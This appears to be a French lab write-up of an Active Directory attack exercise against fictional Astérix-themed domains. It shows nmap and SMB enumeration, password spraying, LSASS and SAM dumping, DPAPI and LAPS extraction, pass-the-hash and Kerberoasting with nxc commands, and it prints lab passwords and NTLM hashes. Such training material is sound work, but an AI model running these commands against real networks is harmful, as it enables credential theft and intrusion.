# WriteUp - Secu AD Avancé

## Enumeration

### SMB

`nxc smb 10.2.0.0/16`

<img src="enum.png" alt="Enumeration." width="450"/>

`IP: 10.2.10.10`
: name:BABAORUM (DC)
domain:rome.local | Windows 10 / Server 2019 Build 7763

`IP: 10.2.10.11`
: name:METRONUM
domain:rome.local | Windows 10 / Server 2019 Build 7763

`IP: 10.2.10.12`
: name:REFERENDUM
domain:rome.local | Windows 10 / Server 2019 Build 7763

`IP: 10.2.10.13`
: name:VILLAGE (DC)
domain:armorique.local | Windows 10 / Server 2019 Build 7763

`IP: 10.2.10.21`
: name:M2-WIN11-22H2-1
domain:M2-WIN11-22H2-1 | Windows 11 Build 22621

![smbguest.png](smbguest.png)

![smbnull.png](smbnull.png)

### HOSTS

<img src="hosts.png" alt="Enumeration." width="450"/>

### nmap

`nmap -p- -sV -sC -iL our.ip -oN workshop.nmap -Pn`

```plain text
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-07 15:51 UTC
Nmap scan report for babaorum (10.2.10.10)
Host is up (0.00077s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-07 15:51:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rome.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rome.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=babaorum.rome.local
| Not valid before: 2025-02-24T01:13:14
|_Not valid after:  2025-08-26T01:13:14
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=WIN2019-SRV-X64
| Subject Alternative Name: DNS:WIN2019-SRV-X64, DNS:WIN2019-SRV-X64
| Not valid before: 2025-02-23T15:29:56
|_Not valid after:  2035-02-21T15:29:56
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49758/tcp open  msrpc         Microsoft Windows RPC
60275/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/7%Time=67CB160B%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-07T15:55:03
|_  start_date: N/A

Nmap scan report for metronum (10.2.10.11)
Host is up (0.00078s latency).
Not shown: 65517 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     220-FileZilla Server 1.8.2
|     Please visit https://filezilla-project.org/
|   GetRequest: 
|     220-FileZilla Server 1.8.2
|     Please visit https://filezilla-project.org/
|     What are you trying to do? Go away.
|   HTTPOptions, RTSPRequest: 
|     220-FileZilla Server 1.8.2
|     Please visit https://filezilla-project.org/
|     Wrong command.
|   Help: 
|     220-FileZilla Server 1.8.2
|     Please visit https://filezilla-project.org/
|     214-The following commands are recognized.
|     RNTO RNFR XPWD MDTM REST APPE MKD RMD DELE
|     ALLO STOR SIZE CDUP CWD TYPE SYST MFMT MODE XRMD
|     ADAT PROT PBSZ MLSD LIST XCWD NOOP AUTH OPTS EPRT
|     PASS QUIT PWD RETR USER NLST CLNT FEAT ABOR HELP
|     XMKD MLST STRU PASV EPSV PORT STAT
|_    Help ok.
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla.
| ssl-cert: Subject: commonName=filezilla-server self signed certificate
| Not valid before: 2025-02-25T01:34:11
|_Not valid after:  2026-02-26T01:39:11
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=METRONUM.rome.local
| Not valid before: 2025-02-24T01:22:29
|_Not valid after:  2025-08-26T01:22:29
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=WIN2019-SRV-X64
| Subject Alternative Name: DNS:WIN2019-SRV-X64, DNS:WIN2019-SRV-X64
| Not valid before: 2025-02-23T15:29:56
|_Not valid after:  2035-02-21T15:29:56
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
| tls-alpn: 
|_  http/1.1
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
52378/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.80%I=7%D=3/7%Time=67CB160C%P=x86_64-pc-linux-gnu%r(NULL,
SF:4D,"220-FileZilla\x20Server\x201\.8\.2\r\n220\x20Please\x20visit\x20htt
SF:ps://filezilla-project\.org/\r\n")%r(GenericLines,4D,"220-FileZilla\x20
SF:Server\x201\.8\.2\r\n220\x20Please\x20visit\x20https://filezilla-projec
SF:t\.org/\r\n")%r(Help,17C,"220-FileZilla\x20Server\x201\.8\.2\r\n220\x20
SF:Please\x20visit\x20https://filezilla-project\.org/\r\n214-The\x20follow
SF:ing\x20commands\x20are\x20recognized\.\r\n\x20NOP\x20\x20RNTO\x20RNFR\x
SF:20XPWD\x20MDTM\x20REST\x20APPE\x20MKD\x20\x20RMD\x20\x20DELE\r\n\x20ALL
SF:O\x20STOR\x20SIZE\x20CDUP\x20CWD\x20\x20TYPE\x20SYST\x20MFMT\x20MODE\x2
SF:0XRMD\r\n\x20ADAT\x20PROT\x20PBSZ\x20MLSD\x20LIST\x20XCWD\x20NOOP\x20AU
SF:TH\x20OPTS\x20EPRT\r\n\x20PASS\x20QUIT\x20PWD\x20\x20RETR\x20USER\x20NL
SF:ST\x20CLNT\x20FEAT\x20ABOR\x20HELP\r\n\x20XMKD\x20MLST\x20STRU\x20PASV\
SF:x20EPSV\x20PORT\x20STAT\r\n214\x20Help\x20ok\.\r\n")%r(GetRequest,76,"2
SF:20-FileZilla\x20Server\x201\.8\.2\r\n220\x20Please\x20visit\x20https://
SF:filezilla-project\.org/\r\n501\x20What\x20are\x20you\x20trying\x20to\x2
SF:0do\?\x20Go\x20away\.\r\n")%r(HTTPOptions,61,"220-FileZilla\x20Server\x
SF:201\.8\.2\r\n220\x20Please\x20visit\x20https://filezilla-project\.org/\
SF:r\n500\x20Wrong\x20command\.\r\n")%r(RTSPRequest,61,"220-FileZilla\x20S
SF:erver\x201\.8\.2\r\n220\x20Please\x20visit\x20https://filezilla-project
SF:\.org/\r\n500\x20Wrong\x20command\.\r\n")%r(RPCCheck,4D,"220-FileZilla\
SF:x20Server\x201\.8\.2\r\n220\x20Please\x20visit\x20https://filezilla-pro
SF:ject\.org/\r\n")%r(DNSVersionBindReqTCP,4D,"220-FileZilla\x20Server\x20
SF:1\.8\.2\r\n220\x20Please\x20visit\x20https://filezilla-project\.org/\r\
SF:n")%r(DNSStatusRequestTCP,4D,"220-FileZilla\x20Server\x201\.8\.2\r\n220
SF:\x20Please\x20visit\x20https://filezilla-project\.org/\r\n")%r(SSLSessi
SF:onReq,4D,"220-FileZilla\x20Server\x201\.8\.2\r\n220\x20Please\x20visit\
SF:x20https://filezilla-project\.org/\r\n")%r(TerminalServerCookie,4D,"220
SF:-FileZilla\x20Server\x201\.8\.2\r\n220\x20Please\x20visit\x20https://fi
SF:lezilla-project\.org/\r\n")%r(TLSSessionReq,4D,"220-FileZilla\x20Server
SF:\x201\.8\.2\r\n220\x20Please\x20visit\x20https://filezilla-project\.org
SF:/\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-07T15:55:09
|_  start_date: N/A

Nmap scan report for village (10.2.10.12)
Host is up (0.00086s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=REFERENDUM.rome.local
| Not valid before: 2025-02-24T01:22:29
|_Not valid after:  2025-08-26T01:22:29
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=WIN2019-SRV-X64
| Subject Alternative Name: DNS:WIN2019-SRV-X64, DNS:WIN2019-SRV-X64
| Not valid before: 2025-02-23T15:29:56
|_Not valid after:  2035-02-21T15:29:56
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
| tls-alpn: 
|_  http/1.1
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
51201/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-07T15:55:18
|_  start_date: N/A

Nmap scan report for 10.2.10.13
Host is up (0.00090s latency).
Not shown: 65503 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-07 15:53:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=village.armorique.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:village.armorique.local
| Not valid before: 2025-02-25T01:26:31
|_Not valid after:  2026-02-25T01:26:31
|_ssl-date: 2025-03-07T15:55:32+00:00; -4s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=village.armorique.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:village.armorique.local
| Not valid before: 2025-02-25T01:26:31
|_Not valid after:  2026-02-25T01:26:31
|_ssl-date: 2025-03-07T15:55:33+00:00; -4s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=village.armorique.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:village.armorique.local
| Not valid before: 2025-02-25T01:26:31
|_Not valid after:  2026-02-25T01:26:31
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=village.armorique.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:village.armorique.local
| Not valid before: 2025-02-25T01:26:31
|_Not valid after:  2026-02-25T01:26:31
|_ssl-date: 2025-03-07T15:55:32+00:00; -4s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=village.armorique.local
| Not valid before: 2025-02-24T01:13:14
|_Not valid after:  2025-08-26T01:13:14
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=WIN2019-SRV-X64
| Subject Alternative Name: DNS:WIN2019-SRV-X64, DNS:WIN2019-SRV-X64
| Not valid before: 2025-02-23T15:29:56
|_Not valid after:  2035-02-21T15:29:56
|_ssl-date: 2025-03-07T15:55:33+00:00; -3s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49488/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49770/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/7%Time=67CB1657%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: VILLAGE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -4s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-07T15:55:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 356.40 seconds
```

### Enumeration Partage SMB

![smbaccess.png](smbaccess.png)
![smbaccesguest.png](smbaccesguest.png)
![smbmetro.png](smbmetro.png)


#### Récupération fichiers

![recupfiles.png](recupfiles.png)
<br></br>
![mdpsmb.png](mdpsmb.png)

`ID: heftepix`
: BnfMQ9QI81Tz

### FTP

![ftpfiles.png](ftpfiles.png)

`ID: ???`
: wUSYIuhhWy!!12OL

### SMB Username Enum

```plain text
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
localuser
localix
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
localuser
localix
Administrator
Guest
krbtgt
localuser
BABAORUM$
METRONUM$
REFERENDUM$
MSOL_80541c18ebaa
lapsus
jules.cesar
brutus
caius.bonus
caius.laius
caius.pupus
motus
couverdepus
processus
cartapus
oursenplus
detritus
blocus
musculus
radius
briseradius
plexus
marcus.sacapus
yenapus
chorus
cleopatre
epidemais
numerobis
amonbofis
tournevis
tumeheris
```

## Exploit

### Password Spray

`nxc smb our.ip -u user.o -p 'wUSYIuhhWy!!12OL' --local-auth`

![pspray.png](pspray.png)

### Dump LSAS

`nxc smb metronum -u 'localix' -p 'wUSYIuhhWy!!12OL' --local-auth -M lsassy`

![dlsas.png](dlsas.png)

`nxc smb metronum -u 'localix' -p 'wUSYIuhhWy!!12OL' --local-auth --sam`

![image.png](image.png)

`ID: ROME\musculus`
: c6f7c388039d669efc7bf167f1507e2b

`ID: localuser`
: 8846f7eaee8fb117ad06bdd830b7586c

### SMB Access Musculus

`nxc smb our.ip -u 'musculus' -H c6f7c388039d669efc7bf167f1507e2b`

![smbaccmus.png](smbaccmus.png)

### Enum Users Musculus

`nxc smb our.ip -u musculus -H c6f7c388039d669efc7bf167f1507e2b`

```plain text
SMB         10.2.10.11      445    METRONUM         -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.2.10.11      445    METRONUM         Administrator                 2025-02-25 01:33:37 1       Built-in account for administering the computer/domain
SMB         10.2.10.11      445    METRONUM         DefaultAccount                <never>             1       A user account managed by the system.
SMB         10.2.10.10      445    BABAORUM         -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.2.10.11      445    METRONUM         Guest                         <never>             1       Built-in account for guest access to the computer/domain
SMB         10.2.10.10      445    BABAORUM         Administrator                 2025-02-25 01:09:47 0       Built-in account for administering the computer/domain
SMB         10.2.10.10      445    BABAORUM         Guest                         2025-02-25 01:38:14 0       Built-in account for guest access to the computer/domain
SMB         10.2.10.11      445    METRONUM         localix                       2025-02-25 01:32:00 0
SMB         10.2.10.11      445    METRONUM         localuser                     2025-02-25 00:54:31 1       LocalUser
SMB         10.2.10.10      445    BABAORUM         krbtgt                        2025-02-25 01:13:12 0       Key Distribution Center Service Account
SMB         10.2.10.11      445    METRONUM         WDAGUtilityAccount            2025-02-25 04:28:40 1       A user account managed and used by the system for Windows Defender Application Guard scenarios.
SMB         10.2.10.10      445    BABAORUM         localuser                     2025-02-25 00:54:31 0       LocalUser
SMB         10.2.10.11      445    METRONUM         [*] Enumerated 6 local users: METRONUM
SMB         10.2.10.10      445    BABAORUM         MSOL_80541c18ebaa             2025-02-25 01:25:31 0       Not Azure DcSync
SMB         10.2.10.10      445    BABAORUM         lapsus                        2025-02-25 01:25:42 0       lapsus
SMB         10.2.10.10      445    BABAORUM         jules.cesar                   2025-02-25 01:25:52 0       Jules Cesar
SMB         10.2.10.10      445    BABAORUM         brutus                        2025-02-25 01:26:03 0       Brutus
SMB         10.2.10.10      445    BABAORUM         caius.bonus                   2025-02-25 01:26:13 0       Caius Bonus
SMB         10.2.10.10      445    BABAORUM         caius.laius                   2025-02-25 01:26:22 0       Caius Laius
SMB         10.2.10.10      445    BABAORUM         caius.pupus                   2025-02-25 01:26:33 0       Caius Pupus
SMB         10.2.10.10      445    BABAORUM         motus                         2025-02-25 01:26:43 0       Motus
SMB         10.2.10.10      445    BABAORUM         couverdepus                   2025-02-25 01:26:52 0       Couverdepus
SMB         10.2.10.10      445    BABAORUM         processus                     2025-02-25 01:27:02 0       Processus
SMB         10.2.10.10      445    BABAORUM         cartapus                      2025-02-25 01:27:12 0       Cartapus
SMB         10.2.10.10      445    BABAORUM         oursenplus                    2025-02-25 01:27:20 0       Oursenplus
SMB         10.2.10.10      445    BABAORUM         detritus                      2025-02-25 01:27:28 0       Detritus
SMB         10.2.10.10      445    BABAORUM         blocus                        2025-02-25 01:27:37 0       Blocus
SMB         10.2.10.10      445    BABAORUM         musculus                      2025-02-25 01:27:47 0       Musculus
SMB         10.2.10.10      445    BABAORUM         radius                        2025-02-25 01:27:56 0       Radius
SMB         10.2.10.10      445    BABAORUM         briseradius                   2025-02-25 01:28:05 0       Briseradius
SMB         10.2.10.10      445    BABAORUM         plexus                        2025-02-25 01:28:14 0       Plexus
SMB         10.2.10.10      445    BABAORUM         marcus.sacapus                2025-02-25 01:28:24 0       Marcus Sacapus
SMB         10.2.10.10      445    BABAORUM         yenapus                       2025-02-25 01:28:33 0       Yenapus
SMB         10.2.10.10      445    BABAORUM         chorus                        2025-02-25 01:28:39 0       Chorus
SMB         10.2.10.10      445    BABAORUM         cleopatre                     2025-02-25 01:28:46 0       Cleopatre
SMB         10.2.10.10      445    BABAORUM         epidemais                     2025-02-25 01:28:53 0       Epidemais
SMB         10.2.10.10      445    BABAORUM         numerobis                     2025-02-25 01:29:00 0       Numerobis
SMB         10.2.10.10      445    BABAORUM         amonbofis                     2025-02-25 01:29:08 0       Amonbofis
SMB         10.2.10.10      445    BABAORUM         tournevis                     2025-02-25 01:29:16 0       Tournevis
SMB         10.2.10.10      445    BABAORUM         tumeheris                     2025-02-25 01:29:24 0       Tumeheris
SMB         10.2.10.10      445    BABAORUM         [*] Enumerated 31 local users: ROME
```

### DPAPI

`nxc smb our.ip -u musculus -H c6f7c388039d669efc7bf167f1507e2b --dpapi`

![dpapi.png](dpapi.png)

`ID: lapsus`
: hC78*K,Zv+z123

### LAPS

![lapsac.png](lapsac.png)

`ID: METRONUM\administrator`
: J%a8E8klzSC$Ax

`ID: REFERENDUM\administrator`
: p4fI6FsG[.%75(

### Dump LSAS Number TWO

`nxc smb metronum -u administrator -p 'J%a8E8klzSC$Ax' --local-auth -M lsassy`

![lsassymetro.png](lsassymetro.png)

`ID: METRONUM\localix`
: 6a876cf1ec742aa43891b97c5acb6a09

`ID: ROME\musculus`
: c6f7c388039d669efc7bf167f1507e2b

`nxc smb referendum -u administrator -p 'p4fI6FsG[.%75(' --local-auth -M lsassy`

![lsassyref.png](lsassyref.png)

`ID: ROME\jules.cesar`
: 56a11817ecf71437f029ecd58acc54be

## Pivot

`nxc smb 10.2.10.13 -u '' -p '' --users`

```plain text
root@ensho:~# nxc smb 10.2.10.13 -u '' -p '' --users
SMB         10.2.10.13      445    VILLAGE          [*] Windows 10 / Server 2019 Build 17763 x64 (name:VILLAGE) (domain:armorique.local) (signing:True) (SMBv1:False)
SMB         10.2.10.13      445    VILLAGE          [+] armorique.local\: 
SMB         10.2.10.13      445    VILLAGE          -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.2.10.13      445    VILLAGE          Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.2.10.13      445    VILLAGE          asterix                       2025-02-25 01:25:35 0       Asterix
SMB         10.2.10.13      445    VILLAGE          obelix                        2025-02-25 01:25:50 0       Obelix
SMB         10.2.10.13      445    VILLAGE          panoramix                     2025-02-25 01:26:04 0       Panoramix
SMB         10.2.10.13      445    VILLAGE          abraracourcix                 2025-02-25 01:26:17 0       Abraracourcix
SMB         10.2.10.13      445    VILLAGE          assurancetourix               2025-02-25 01:26:30 0       Assurancetourix
SMB         10.2.10.13      445    VILLAGE          bonemine                      2025-02-25 01:26:43 0       Bonemine
SMB         10.2.10.13      445    VILLAGE          ordralfabetix                 2025-02-25 01:26:56 0       Ordralfabetix
SMB         10.2.10.13      445    VILLAGE          cetautomatix                  2025-02-25 01:27:08 0       Cetautomatix
SMB         10.2.10.13      445    VILLAGE          idefix                        2025-02-25 01:27:20 0       Idefix
SMB         10.2.10.13      445    VILLAGE          agecanonix                    2025-02-25 01:27:34 0       Agecanonix
SMB         10.2.10.13      445    VILLAGE          vercingetorix                 2025-02-25 01:27:46 0       Vercingetorix
SMB         10.2.10.13      445    VILLAGE          goudurix                      2025-02-25 01:28:00 0       Goudurix
SMB         10.2.10.13      445    VILLAGE          jolitorax                     2025-02-25 01:28:20 0       Jolitorax
SMB         10.2.10.13      445    VILLAGE          pepe                          2025-02-25 01:28:32 0       Pepe
SMB         10.2.10.13      445    VILLAGE          cicatrix                      2025-02-25 01:28:45 0       Cicatrix
SMB         10.2.10.13      445    VILLAGE          falbala                       2025-02-25 01:28:58 0       Falbala
SMB         10.2.10.13      445    VILLAGE          tragicomix                    2025-02-25 01:29:11 0       Tragicomix
SMB         10.2.10.13      445    VILLAGE          diagnostix                    2025-02-25 01:29:26 0       Diagnostix
SMB         10.2.10.13      445    VILLAGE          antibiotix                    2025-02-25 01:29:35 0       Antibiotix
SMB         10.2.10.13      445    VILLAGE          ordalfabétix                  2025-02-25 01:29:44 0       Ordalfabétix
SMB         10.2.10.13      445    VILLAGE          prolix                        2025-02-25 01:29:52 0       Prolix
SMB         10.2.10.13      445    VILLAGE          informatix                    2025-02-25 01:30:00 0       Informatix
SMB         10.2.10.13      445    VILLAGE          alambix                       2025-02-25 01:30:08 0       Alambix
SMB         10.2.10.13      445    VILLAGE          porquépix                     2025-02-25 01:30:16 0       Porquépix
SMB         10.2.10.13      445    VILLAGE          beaufix                       2025-02-25 01:30:24 0       Beaufix
SMB         10.2.10.13      445    VILLAGE          [*] Enumerated 26 local users: ARMORIQUE
```

```plain text
Guest
asterix
obelix
panoramix
abraracourcix
assurancetourix
bonemine
ordralfabetix
cetautomatix
idefix
agecanonix
vercingetorix
goudurix
jolitorax
pepe
cicatrix
falbala
tragicomix
diagnostix
antibiotix
ordalfabétix
prolix
informatix
alambix
porquépix
beaufix
```
`nxc smb 10.2.10.13 -u 'localuser' -H 8846f7eaee8fb117ad06bdd830b7586c`

![image_2.png](image_2.png)

`nxc ldap village -u 'localuser' -H 8846f7eaee8fb117ad06bdd830b7586c --kerberoast 'alambix.kerberoasting'`

![image_3.png](image_3.png)
